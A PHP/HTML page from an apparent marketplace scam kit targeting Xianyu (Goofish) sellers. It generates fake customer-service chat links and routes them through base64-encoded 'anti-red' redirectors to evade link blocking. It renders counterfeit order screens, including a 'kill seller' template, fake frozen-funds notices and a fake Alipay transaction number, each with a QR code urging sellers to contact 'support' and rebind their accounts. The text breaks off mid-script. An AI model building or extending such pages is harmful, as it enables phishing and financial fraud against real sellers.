<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';
checkLogin(); // 验证登录状态

// 获取当前登录的客服信息
$currentAgent = $_SESSION['username'];

// 生成随机6位客户名称（A-Z, a-z, 0-9）
function generateCustomerName($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
// 生成XEDATA令牌
function generateXEDataToken() {
    return md5(uniqid(mt_rand(), true));
}

// 创建会话记录到 XE-SKDJWKSNCDATA 表
function createChatSession($sessionId, $customerName, $agentAccount, $platform = '闲鱼') {
    $db = getDB();
    if (!$db) return false;
    
    $xedataToken = generateXEDataToken();
    $expiresAt = date('Y-m-d H:i:s', strtotime('+7 days'));
    
    $stmt = $db->prepare("INSERT INTO `XE-SKDJWKSNCDATA` 
                         (session_id, xedata_token, customer_name, agent_account, expires_at, platform) 
                         VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $sessionId, $xedataToken, $customerName, $agentAccount, $expiresAt, $platform);
    
    if ($stmt->execute()) {
        return $xedataToken;
    }
    return false;
}
$customerName = generateCustomerName();

$sessionId = 'a' . $customerName . 'z-p' . $currentAgent . 's';
// 生成XEDATA令牌并保存到数据库
$xedataToken = createChatSession($sessionId, $customerName, $currentAgent, '闲鱼');

// 获取当前域名和协议
$currentDomain = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl = $protocol . "://" . $currentDomain;

$originalServiceUrl = $baseUrl . '/' . "ChatGoofish" . '?id=' . $sessionId;

// 添加XEDATA参数
if ($xedataToken) {
    $originalServiceUrl .= '&XEDATA=' . $xedataToken;
}

// 获取防红配置（修复版，调整优先级）
function getAntiRedConfig($username) {
     $db = getDB();
    if (!$db) return null;
    
    // 1. 首先检查防红开关是否开启
    $stmt = $db->prepare("SELECT apply_status FROM user_anti_red_config WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    $config = $result->fetch_assoc();
    
    if (!$config) {
        // 如果没有配置记录，默认防红开关开启
        $apply_status = 'on';
    } else {
        $apply_status = $config['apply_status'];
    }
    
    // 如果防红开关关闭，直接返回null
    if ($apply_status === 'off') {
        return null;
    }
    
    // 2. 防红开关开启的情况下，检查session中是否有应用的接口（付费或免费）
    if (isset($_SESSION['applied_api_url']) && !empty($_SESSION['applied_api_url'])) {
        $type = $_SESSION['applied_domain_type'] ?? 'paid';
        $applied_domain = $_SESSION['applied_domain'] ?? '付费接口';
        
        return [
            'api_url' => $_SESSION['applied_api_url'],
            'apply_status' => 'on',
            'applied_domain' => $applied_domain,
            'encoding_mode' => 'base64',
            'type' => $type
        ];
    }
    
    // 3. 检查session中是否有自定义接口
    if (isset($_SESSION['custom_interface_url']) && !empty($_SESSION['custom_interface_url'])) {
        return [
            'api_url' => $_SESSION['custom_interface_url'],
            'apply_status' => 'on',
            'applied_domain' => isset($_SESSION['custom_interface_remark']) ? $_SESSION['custom_interface_remark'] : '自定义接口',
            'encoding_mode' => isset($_SESSION['custom_encoding_mode']) ? $_SESSION['custom_encoding_mode'] : 'base64',
            'type' => 'custom'
        ];
    }
    
    // 4. 从数据库查询用户配置
    if ($config['apply_status'] === 'on' && !empty($config['applied_domain'])) {
        $applied_domain = $config['applied_domain'];
        
        // 先尝试从免费接口表中查找
        $freeStmt = $db->prepare("SELECT api_url FROM freeantired WHERE name = ? AND status = 'active'");
        $freeStmt->bind_param("s", $applied_domain);
        $freeStmt->execute();
        $freeResult = $freeStmt->get_result();
        
        if ($freeResult->num_rows > 0) {
            // 是免费接口
            $freeData = $freeResult->fetch_assoc();
            $config['api_url'] = $freeData['api_url'];
            $config['type'] = 'free';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 再尝试从付费接口表中查找
        $paidStmt = $db->prepare("SELECT api_url FROM anti_red_links WHERE domain_name = ? AND sold_to = ?");
        $paidStmt->bind_param("ss", $applied_domain, $username);
        $paidStmt->execute();
        $paidResult = $paidStmt->get_result();
        
        if ($paidResult->num_rows > 0) {
            // 是付费接口
            $paidData = $paidResult->fetch_assoc();
            $config['api_url'] = $paidData['api_url'];
            $config['type'] = 'paid';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 如果都不是，检查是否是自定义接口（在 userantired 表中）
        $customStmt = $db->prepare("SELECT ua.api_url, ua.encoding 
                                    FROM userantired ua 
                                    JOIN users u ON ua.user_id = u.id 
                                    WHERE u.username = ? AND ua.remark = ? AND ua.status = 'active'");
        $customStmt->bind_param("ss", $username, $applied_domain);
        $customStmt->execute();
        $customResult = $customStmt->get_result();
        
        if ($customResult->num_rows > 0) {
            // 是自定义接口
            $customData = $customResult->fetch_assoc();
            $config['api_url'] = $customData['api_url'];
            $config['encoding_mode'] = $customData['encoding'] ?? 'base64';
            $config['type'] = 'custom';
            return $config;
        }
    }
    
    return null;
}

$antiRedConfig = getAntiRedConfig($currentAgent);
$serviceUrl = $originalServiceUrl;

// 读取源站URL配置
$db = getDB();
$webconfigResult = $db->query("SELECT site_url, site_url_enabled FROM webconfig ORDER BY id DESC LIMIT 1");
$siteUrlConfig = null;
if ($webconfigResult && $webconfigResult->num_rows > 0) {
    $siteUrlConfig = $webconfigResult->fetch_assoc();
}

if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])) {
    // 开启防红，保持原样不变
    $encoding_mode = $antiRedConfig['encoding_mode'] ?? 'base64';
    
    // 根据编码模式处理URL
    switch ($encoding_mode) {
        case 'base64':
            $encodedUrl = base64_encode($originalServiceUrl);
            break;
        case 'urlencode':
        case 'url':
            $encodedUrl = urlencode($originalServiceUrl);
            break;
        case 'none':
        default:
            $encodedUrl = $originalServiceUrl;
            break;
    }
    
    $serviceUrl = $antiRedConfig['api_url'] . $encodedUrl;
} elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])) {
    // 开启源站URL跳转，用源站URL + base64编码原链接
    $serviceUrl = $siteUrlConfig['site_url'] . base64_encode($originalServiceUrl);
}

// 输出调试信息（开发环境中使用）
if (isset($_GET['debug'])) {
    echo "<!-- 防红配置信息: " . json_encode($antiRedConfig) . " -->\n";
    echo "<!-- 源站URL配置: " . json_encode($siteUrlConfig) . " -->\n";
    echo "<!-- 原始URL: $originalServiceUrl -->\n";
    echo "<!-- 最终URL: $serviceUrl -->\n";
    echo "<!-- Session状态: " . json_encode([
        'custom_interface_url' => $_SESSION['custom_interface_url'] ?? '未设置',
        'custom_encoding_mode' => $_SESSION['custom_encoding_mode'] ?? '未设置',
        'custom_interface_remark' => $_SESSION['custom_interface_remark'] ?? '未设置',
        'applied_api_url' => $_SESSION['applied_api_url'] ?? '未设置',
        'applied_domain' => $_SESSION['applied_domain'] ?? '未设置',
        'applied_domain_type' => $_SESSION['applied_domain_type'] ?? '未设置',
        'redirect_to_browser' => $_SESSION['redirect_to_browser'] ?? '未设置'
    ]) . " -->\n";
}

// 图片上传处理
$uploadedImageUrl = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $targetDir = $_SERVER['DOCUMENT_ROOT'] . '/uploads/share/';
    
    // 确保目录存在
    if (!file_exists($targetDir)) {
        mkdir($targetDir, 0755, true);
    }
    
    $fileName = uniqid() . '_' . basename($_FILES['image']['name']);
    $targetFile = $targetDir . $fileName;
    
    // 检查文件类型
    $imageFileType = strtolower(pathinfo($targetFile, PATHINFO_EXTENSION));
    $allowedTypes = array('jpg', 'jpeg', 'png', 'gif');
    
    if (in_array($imageFileType, $allowedTypes)) {
        if (move_uploaded_file($_FILES['image']['tmp_name'], $targetFile)) {
            $uploadedImageUrl = $baseUrl . '/uploads/share/' . $fileName;
            echo json_encode(['success' => true, 'url' => $uploadedImageUrl]);
            exit;
        }
    }
    echo json_encode(['success' => false, 'message' => '上传失败']);
    exit;
}

?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>分享页</title>
	
	<link rel="stylesheet" href="/assets/bootstrap-icons.css">
    <link rel="stylesheet" href="/assets/SharePhoto/main.css">
	<link rel="stylesheet" href="/assets/SharePhoto/xianyu.css">
	 
</head>
<body> 

<div id="app" data-v-app="">
    <div class="app-container">
        <div class="scroll-container">

            <div class="form-container">
                <div class="form-row">
                    <label>防红</label>
                    <a class="form-link anti-red-link" id="anti-red-status">
                            <?php 
                            if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on') {
                                echo '已配置 (' . $antiRedConfig['applied_domain'] . ')';
                            } else {
                                echo '未配置';
                            }
                            ?> </a>
                         <!-- 移除刷新按钮 -->
                    <div class="copy-link-btn" id="copy-link-btn">
                        <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="18">
                            <path
                                d="M761.088 715.3152a38.7072 38.7072 0 0 1 0-77.4144 37.4272 37.4272 0 0 0 37.4272-37.4272V265.0112a37.4272 37.4272 0 0 0-37.4272-37.4272H425.6256a37.4272 37.4272 0 0 0-37.4272 37.4272 38.7072 38.7072 0 1 1-77.4144 0 115.0976 115.0976 0 0 1 114.8416-114.8416h335.4624a115.0976 115.0976 0 0 1 114.8416 114.8416v335.4624a115.0976 115.0976 0 0 1-114.8416 114.8416z"
                                p-id="5993" fill="#515151"></path>
                            <path
                                d="M589.4656 883.0976H268.1856a121.1392 121.1392 0 0 1-121.2928-121.2928v-322.56a121.1392 121.1392 0 0 1 121.2928-121.344h321.28a121.1392 121.1392 0 0 1 121.2928 121.2928v322.56c1.28 67.1232-54.1696 121.344-121.2928 121.344zM268.1856 395.3152a43.52 43.52 0 0 0-43.8784 43.8784v322.56a43.52 43.52 0 0 0 43.8784 43.8784h321.28a43.52 43.52 0 0 0 43.8784-43.8784v-322.56a43.52 43.52 0 0 0-43.8784-43.8784z"
                                p-id="5994" fill="#515151"></path>
                        </svg>
                        <div>复制链接</div>
                    </div>
                </div>
                <!-- 采集表单 -->
                <div class="form-row" id="caiji-row" style="display: none;">
                    <label>采集</label>
                    <div style="display: flex; flex: 1; gap: 8px; align-items: center;">
                        <input type="text" id="caiji-url-input" placeholder="输入闲鱼商品链接">
                        <button type="button" id="caiji-btn" style="white-space: nowrap; background: #4a7bff; color: #fff; border: none; border-radius: 6px; padding: 6px 16px; font-size: 14px; cursor: pointer; transition: background 0.2s;">采集</button>
                    </div>
                </div>
                <!-- 修改模板选择下拉框 -->
                <div class="form-row">
                    <label>模板</label>
                    <select id="template-select">
                        <option value="1">游戏</option>
                        <option value="2">实物-发货</option>
                        <option value="3">实物-验货</option>
                        <option value="4">老版本违规</option>
                        <option value="5">老版本游戏</option>
                        <option value="6">杀卖家</option>
                    </select>
                </div>
                
        
                <div class="form-row">
                    <label>标题</label>
                    <input type="text" id="title-input">
                    <div class="form-hint" id="title-hint">请填写标题</div>
                </div>
                <div class="form-row">
                    <label>价格</label>
                    <input type="text" id="price-input">
                    <div class="form-hint" id="price-hint">请填写价格</div>
                </div>
                <div class="form-row">
                    <label>扫码</label>
                    <select id="pay-select">
                        <option value="微信">微信(推荐)</option>
                        <option value="支付宝">支付宝</option>
                        <option value="QQ">QQ</option>
                        <option value="百度">百度</option>
                        <option value="浏览器">浏览器</option>
                    </select>
                </div>
                
                <!-- 卖家名称输入框 -->
                <div class="form-row" id="seller-name-row" style="display: none;">
                    <label>卖家名称</label>
                    <input type="text" id="seller-name-input" placeholder="请输入卖家名称">
                    <div class="form-hint" id="seller-name-hint">请填写卖家名称</div>
                </div>
                <div class="form-row" style="padding: 16px 16px 16px;">
                    <label>封面图</label>
                    <div>
                        <label for="upload-cover" class="form-link" id="upload-label">上传图片</label>
                        <div id="image-link-display" class="image-link-display"></div>
                        <div class="form-hint" id="image-hint">请上传封面图</div>
                    </div>
                    <input type="file" accept="image/*" id="upload-cover" style="display: none;">
                </div>
                
                
                    <!-- 开启订单开关 -->
<div class="form-row" id="order-switch-row" style="padding: 16px 16px 16px;display: none;">
    <label>是否生成订单</label>
    <div class="switch-container">
        <label class="toggle-switch disabled" id="switch-container">
            <input type="checkbox" id="order-switch" disabled>
            <span class="switch-slider"></span>
        </label>
    </div>
    <!-- 移除固定提示 -->
</div>
                <!-- 在现有表单后面添加收货信息表单行 -->
                <div class="form-row" id="receiver-name-row" style="display: none;">
                    <label>收货姓名</label>
                    <input type="text" id="receiver-name-input">
                </div>
                <div class="form-row" id="receiver-phone-row" style="display: none;">
                    <label>收货手机号</label>
                    <input type="text" id="receiver-phone-input">
                </div>
                <div class="form-row" id="receiver-address-row" style="display: none;">
                    <label>收货地址</label>
                    <input type="text" id="receiver-address-input">
                </div>
                <!-- 修改表单部分，将扫码改为二维码链接输入框 -->
                <div class="form-row" id="qr-link-row" style="display: none;">
                    <label>链接</label>
                    <input type="text" id="qr-link-input" placeholder="请输入二维码链接">
                </div>
            </div>
            <!-- 预览区域开始 -->
            <div class="preview-section">
                <div class="preview-content">
                    <svg version="1.1" xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <symbol id="bold-arrow-down">
                            <path
                                d="M52.335 261.072c-31.269 30.397-31.269 79.722 0 110.194l403.212 391.718c31.325 30.382 82.114 30.382 113.377 0l403.197-391.718c31.325-30.466 31.325-79.793 0-110.194-31.28-30.449-82.058-30.449-113.39 0l-346.497 336.64-346.457-336.64c-31.325-30.448-82.105-30.448-113.446 0l0 0z"
                                fill="#272636"></path>
                        </symbol>
                    </svg>
                    <div class="preview-header">
                        <svg class="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
                            <use xlink:href="#arrow-left"></use>
                        </svg>
                        <svg class="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
                            <use xlink:href="#three-points"></use>
                        </svg>
                    </div>
                    <div class="preview-body">
                        <div class="preview-title">
                            <div>已付款，等待卖家发货</div>
                            <div class="preview-title-icon">
                                <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="12" height="12">
                                    <use xlink:href="#bold-arrow-down"></use>
                                </svg>
                            </div>
                        </div>
                        <div class="steps-container">
                            <div class="step-line"></div>
                            <div class="step-line dotted"></div>
                            <img src="/assets/img/goofishshare.png" alt="" class="platform-icon">
                            <!-- 步骤区域 -->
                            <div class="step left-edge">
                                <div class="step-icon">
                                    <div class="step-dot completed">√</div>
                                </div>
                                <div id="step-1">已下单</div>
                            </div>
                            <div class="step">
                                <div class="step-icon">
                                    <div class="step-dot"></div>
                                </div>
                                <div id="step-2">联系客服</div>
                            </div>
                            <div class="step">
                                <div class="step-icon">
                                    <div class="step-dot"></div>
                                </div>
                                <div id="step-3">客服换绑</div>
                            </div>
                            <div class="step right-edge">
                                <div class="step-icon">
                                    <div class="step-dot"></div>
                                </div>
                                <div id="step-4">确认收货</div>
                            </div>
                        </div>
                        <div class="info-box">
                            <div class="info-title">商品交易规则</div>
                            <div> 卖家打开<span class="highlight-text" id="preview-pay-type">微信</span>扫码联系客服配合完成交易账号的<span class="highlight-text">换绑操作</span>，稍后等待买家<span class="highlight-text">确认收货</span>完成交易 </div>
                        </div>
                        <div class="info-box">
                            <div class="info-title">联系客服</div>
                            <div class="customer-service-layout">
                                <div class="service-text">
                                    <div>请提醒<span class="highlight-text">卖家扫码发货</span></div>
                                    <div>为保障您的交易安全，请勿将二维码泄露，避免引发资金损失、交易纠纷等风险。</div>
                                </div>
                                <!-- 二维码区域 -->
                                <div class="qrcode-container">
                                    <div id="qrcode"></div>
                                </div>
                            </div>
                        </div>
                        <div class="info-box">
                            <div class="product-layout">
                                <img class="product-image" src="" alt="" id="preview-image">
                                <div class="product-description" id="preview-title"></div>
                                <div class="product-price">
                                    <span class="price-symbol">￥</span>
                                    <span id="preview-price"></span>
                                </div>
                            </div>
                            <div class="price-row">
                                <div>成交价<span class="transaction-id">（在支付宝担保账户中）</span></div>
                                <div><span class="price-symbol">￥</span><span id="preview-price2"></span></div>
                            </div>
                            <div class="price-row">
                                <div>支付宝交易号</div>
                                <div style="font-weight: normal; letter-spacing: 0.2px;">2032492483240948927298</div>
                            </div>
                            <div class="view-more">查看更多</div>
                        </div>
                    </div>
                    <div class="preview-actions">
                        <div class="action-button primary">提醒发货</div>
                        <div class="action-button">更多</div>
                    </div>
                </div>
            </div>
            <!-- 预览区域结束 -->
            <!-- 老版本 违规 -->
            <div class="preview-section">
                <div class="preview-content">
                    <svg version="1.1" xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <symbol id="bold-arrow-down">
                            <path
                                d="M52.335 261.072c-31.269 30.397-31.269 79.722 0 110.194l403.212 391.718c31.325 30.382 82.114 30.382 113.377 0l403.197-391.718c31.325-30.466 31.325-79.793 0-110.194-31.28-30.449-82.058-30.449-113.39 0l-346.497 336.64-346.457-336.64c-31.325-30.448-82.105-30.448-113.446 0l0 0z"
                                fill="#272636"></path>
                        </symbol>
                    </svg>
                    <div class="preview-header">
                        <svg class="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
                            <use xlink:href="#arrow-left"></use>
                        </svg>
                        <svg class="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
                            <use xlink:href="#three-points"></use>
                        </svg>
                    </div>
                    <div class="preview-body">
                        <div class="preview-title">
                            <div>已付款，待客服介入</div>
                            <div class="preview-title-icon">
                                <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="12" height="12">
                                    <use xlink:href="#bold-arrow-down"></use>
                                </svg>
                            </div>
                        </div>
                        <div class="steps-container">
                            <div class="step-line"></div>
                            <div class="step-line dotted"></div>
                            <img src="/assets/img/goofishshare.png" alt="" class="platform-icon">
                            <!-- 步骤区域 -->
                            <div class="step left-edge">
                                <div class="step-icon">
                                    <div class="step-dot completed">√</div>
                                </div>
                                <div>已付款</div>
                            </div>
                            <div class="step">
                                <div class="step-icon">
                                    <div class="step-dot"></div>
                                </div>
                                <div>待发货</div>
                            </div>
                            <div class="step">
                                <div class="step-icon">
                                    <div class="step-dot"></div>
                                </div>
                                <div>待收货</div>
                            </div>
                            <div class="step right-edge">
                                <div class="step-icon">
                                    <div class="step-dot"></div>
                                </div>
                                <div>待评价</div>
                            </div>
                        </div>
                        <div class="info-box">
                            <div class="info-title">商品规范处理</div>
                            <div> 经系统核查发现，<span class="highlight-text">该商家尚未授权《商品合规性保证协议》</span>。为保障您的合法权益，系统<span class="highlight-text">暂时冻结您的资金与订单</span>，<span class="highlight-text">商家联系客服</span>处理并完善相关事宜后，该订单可继续进行交易。 </div>
                        </div>
                        <div class="info-box">
                            <div class="info-title">联系客服</div>
                            <div class="customer-service-layout">
                                <div class="service-text">
                                    <div>请提醒卖家<span class="highlight-text">截图保存相册</span>并<span class="highlight-text">微信扫码联系客服</span></div>
                                    <div>为保障您的交易安全，请勿将二维码泄露，避免引发资金损失、交易纠纷等风险。</div>
                                </div>
                                <!-- 二维码区域 -->
                                <div class="qrcode-container">
                                    <div id="qrcode"></div>
                               
                                </div>
                            </div>
                        </div>
                        <div class="info-box">
                            <div class="laobanweigui2">收货地址</div>
                            <div class="laobanweigui3">
                                <div class="laobanweigui4">姓名</div>
                                <div class="laobanweigui5">吴晓雪</div>
                            </div>
                            <div class="laobanweigui3">
                                <div class="laobanweigui4">手机号</div>
                                <div class="laobanweigui5">152****3211</div>
                            </div>
                            <div class="laobanweigui3">
                                <div class="laobanweigui4">地址</div>
                                <div class="laobanweigui5">山东省枣庄市薛城区常庄街道开源花苑快递驿站</div>
                            </div>
                        </div>
                    </div>
                    <div class="preview-actions">
                        <div class="action-button primary">提醒发货</div>
                        <div class="action-button">更多</div>
                    </div>
                </div>
            </div>
            <!-- 老版本 违规结束 -->
            <!-- 老版本 游戏 -->
            <div class="preview-section">
                <div class="preview-content">
                    <svg version="1.1" xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <symbol id="bold-arrow-down">
                            <path
                                d="M52.335 261.072c-31.269 30.397-31.269 79.722 0 110.194l403.212 391.718c31.325 30.382 82.114 30.382 113.377 0l403.197-391.718c31.325-30.466 31.325-79.793 0-110.194-31.28-30.449-82.058-30.449-113.39 0l-346.497 336.64-346.457-336.64c-31.325-30.448-82.105-30.448-113.446 0l0 0z"
                                fill="#272636"></path>
                        </symbol>
                    </svg>
                    <div class="preview-header">
                        <svg class="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
                            <use xlink:href="#arrow-left"></use>
                        </svg>
                        <svg class="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
                            <use xlink:href="#three-points"></use>
                        </svg>
                    </div>
                    <div class="preview-body">
                        <div class="preview-title">
                            <div>已付款，等待卖家发货</div>
                            <div class="preview-title-icon">
                                <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="12" height="12">
                                    <use xlink:href="#bold-arrow-down"></use>
                                </svg>
                            </div>
                        </div>
                        <div class="steps-container">
                            <div class="step-line"></div>
                            <div class="step-line dotted"></div>
                            <img src="/assets/img/goofishshare.png" alt="" class="platform-icon">
                            <!-- 步骤区域 -->
                            <div class="step left-edge">
                                <div class="step-icon">
                                    <div class="step-dot completed">√</div>
                                </div>
                                <div>已下单</div>
                            </div>
                            <div class="step">
                                <div class="step-icon">
                                    <div class="step-dot"></div>
                                </div>
                                <div>联系客服</div>
                            </div>
                            <div class="step">
                                <div class="step-icon">
                                    <div class="step-dot"></div>
                                </div>
                                <div>客服换绑</div>
                            </div>
                            <div class="step right-edge">
                                <div class="step-icon">
                                    <div class="step-dot"></div>
                                </div>
                                <div>确认收货</div>
                            </div>
                        </div>
                        <div class="info-box">
                            <div class="info-title">商品规范处理</div>
                            <div> 卖家打开<span class="highlight-text">微信</span>扫码联系客服配合完成交易账号的<span class="highlight-text">换绑操作</span>，稍后等待买家<span class="highlight-text">确认收货</span>完成交易 </div>
                        </div>
                        <div class="info-box">
                            <div class="info-title">联系客服</div>
                            <div class="customer-service-layout">
                                <div class="service-text">
                                    <div>请提醒<span class="highlight-text">卖家扫码联系客服</span></div>
                                    <div>为保障您的交易安全，请勿将二维码泄露，避免引发资金损失、交易纠纷等风险。</div>
                                </div>
                                <!-- 二维码区域 -->
                                <div class="qrcode-container">
                                    <div id="qrcode"></div>
                                    
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="preview-actions">
                        <div class="action-button primary">提醒发货</div>
                        <div class="action-button">更多</div>
                    </div>
                </div>
            </div>
            <!-- 老版本 游戏结束 -->
            <!-- 杀卖家 -->
            <div class="preview-section">
                <div class="preview-content">
                    <svg version="1.1" xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <symbol id="bold-arrow-down">
                            <path
                                d="M52.335 261.072c-31.269 30.397-31.269 79.722 0 110.194l403.212 391.718c31.325 30.382 82.114 30.382 113.377 0l403.197-391.718c31.325-30.466 31.325-79.793 0-110.194-31.28-30.449-82.058-30.449-113.39 0l-346.497 336.64-346.457-336.64c-31.325-30.448-82.105-30.448-113.446 0l0 0z"
                                fill="#272636"></path>
                        </symbol>
                    </svg>
                    <div class="preview-header">
                        <svg class="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
                            <use xlink:href="#arrow-left"></use>
                        </svg>
                        <svg class="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
                            <use xlink:href="#three-points"></use>
                        </svg>
                    </div>
                    <div class="preview-body">
                        <div class="preview-title">
                            <div>订单异常，待处理</div>
                            <div class="preview-title-icon">
                                <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="12" height="12">
                                    <use xlink:href="#bold-arrow-down"></use>
                                </svg>
                            </div>
                        </div>
                        <div class="steps-container">
                            <div class="step-line"></div>
                            <div class="step-line dotted"></div>
                            <img src="/assets/img/goofishshare.png" alt="" class="platform-icon">
                            <!-- 步骤区域 -->
                            <div class="step left-edge">
                                <div class="step-icon">
                                    <div class="step-dot completed">√</div>
                                </div>
                                <div>订单锁定</div>
                            </div>
                            <div class="step">
                                <div class="step-icon">
                                    <div class="step-dot"></div>
                                </div>
                                <div>联系客服</div>
                            </div>
                            <div class="step">
                                <div class="step-icon">
                                    <div class="step-dot"></div>
                                </div>
                                <div>规范处理</div>
                            </div>
                            <div class="step right-edge">
                                <div class="step-icon">
                                    <div class="step-dot"></div>
                                </div>
                                <div>继续交易</div>
                            </div>
                        </div>
                        <div class="info-box">
                            <div class="info-title">商品规范处理</div>
                            <p>经核实本单交易双方存在<span class="highlight-text">非真人恶意倒卖</span>等违规等操作，订单<span class="highlight-text">暂时冻结</span>。订单处于冻结状态时，请买卖双方<span class="highlight-text">不要对订单进行任何操作</span>，以免引发不必要的纠纷</p>
                            <p>请双方<span class="highlight-text">保存下方二维码</span>，打开<span class="highlight-text">微信</span>扫描二维码联系人工客服</p>
                        </div>
                        <div class="info-box">
                            <div class="info-title">联系客服</div>
                            <div class="customer-service-layout">
                                <div class="service-text">
                                    <div>请提醒<span class="highlight-text">卖家扫码联系客服</span></div>
                                    <div>为保障您的交易安全，请勿将二维码泄露，避免引发资金损失、交易纠纷等风险。</div>
                                </div>
                                <!-- 二维码区域 -->
                                <div class="qrcode-container">
                                    <div id="qrcode"></div>
                                    
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="preview-actions">
                        <div class="action-button primary">提醒发货</div>
                        <div class="action-button">更多</div>
                    </div>
                </div>
            </div>
            <!-- 杀卖家结束 -->
        </div>
    </div>
</div>
<script src="/assets/qrcode.min.js"></script>
<script>
    // 生成二维码 - 使用PHP动态生成的链接
    var qrCodeUrl = "<?php echo $serviceUrl; ?>";
    var baseUrl = "<?php echo $baseUrl; ?>";
    var imageLink = "";
    var isOrderEnabled = false;
    var orderParams = {
        shop: "",
        title: "",
        rmb: "",
        img: ""
    };
    
    function showMessage(message, isWarning = true) {
        var type = isWarning ? 'error' : 'success';
        showToast(message, type);
    }

    function showToast(message, type) {
        var container = document.getElementById('notification-container');
        if (!container) {
            container = document.createElement('div');
            container.id = 'notification-container';
            container.className = 'notification-container';
            document.body.appendChild(container);
        }

        var toast = document.createElement('div');
        toast.className = 'new-user-toast notification-enter-active';
        if (type) {
            toast.classList.add(type);
        }

        var icon = document.createElement('div');
        icon.className = 'toast-icon';
        icon.textContent = type === 'error' ? '!' : '✓';
        toast.appendChild(icon);

        var text = document.createElement('div');
        text.className = 'toast-text';
        text.textContent = message;
        toast.appendChild(text);

        var closeBtn = document.createElement('button');
        closeBtn.className = 'toast-close';
        closeBtn.innerHTML = '&times;';
        closeBtn.addEventListener('click', function() {
            removeToast(toast);
        });
        toast.appendChild(closeBtn);

        container.appendChild(toast);

        setTimeout(function() {
            toast.classList.add('notification-leave-active');
            setTimeout(function() {
                removeToast(toast);
            }, 300);
        }, 4000);

        function removeToast(toast) {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }
    }
    
    document.addEventListener('DOMContentLoaded', function() {
        // 确保顶部按钮有足够的z-index
        var topHeader = document.querySelector('.top-header');
        if (topHeader) {
            topHeader.style.position = 'relative';
            topHeader.style.zIndex = '1111';
        }
        
        var actionButtons = document.querySelector('.action-buttons');
        if (actionButtons) {
            actionButtons.style.zIndex = '1111';
        }
        
        // 获取DOM元素
        var titleInput = document.getElementById('title-input');
        var priceInput = document.getElementById('price-input');
        var paySelect = document.getElementById('pay-select');
        var uploadCover = document.getElementById('upload-cover');
        var uploadLabel = document.getElementById('upload-label');
        var templateSelect = document.getElementById('template-select');
        var previewPrice = document.getElementById('preview-price');
        var previewPrice2 = document.getElementById('preview-price2');
        var previewPayType = document.getElementById('preview-pay-type');
        var previewImage = document.getElementById('preview-image');
        var previewTitle = document.getElementById('preview-title');
        var step1 = document.getElementById('step-1');
        var step2 = document.getElementById('step-2');
        var step3 = document.getElementById('step-3');
        var step4 = document.getElementById('step-4');
        
        // 获取新增的DOM元素
        var sellerNameRow = document.getElementById('seller-name-row');
        var sellerNameInput = document.getElementById('seller-name-input');
        var sellerNameHint = document.getElementById('seller-name-hint');
        
        var orderSwitchRow = document.getElementById('order-switch-row');
        var orderSwitch = document.getElementById('order-switch');
        var switchContainer = document.getElementById('switch-container');
        var orderSwitchHint = document.getElementById('order-switch-hint');
        
        var titleHint = document.getElementById('title-hint');
        var priceHint = document.getElementById('price-hint');
        var imageHint = document.getElementById('image-hint');
        
        var imageLinkDisplay = document.getElementById('image-link-display');
        
        var receiverNameRow = document.getElementById('receiver-name-row');
        var receiverPhoneRow = document.getElementById('receiver-phone-row');
        var receiverAddressRow = document.getElementById('receiver-address-row');
        var receiverNameInput = document.getElementById('receiver-name-input');
        var receiverPhoneInput = document.getElementById('receiver-phone-input');
        var receiverAddressInput = document.getElementById('receiver-address-input');
        
        // 获取二维码链接相关的DOM元素
        var qrLinkRow = document.getElementById('qr-link-row');
        var qrLinkInput = document.getElementById('qr-link-input');
        var paySelectRow = document.querySelector('.form-row:has(#pay-select)');
        
        // 采集相关DOM
        var caijiRow = document.getElementById('caiji-row');
        var caijiUrlInput = document.getElementById('caiji-url-input');
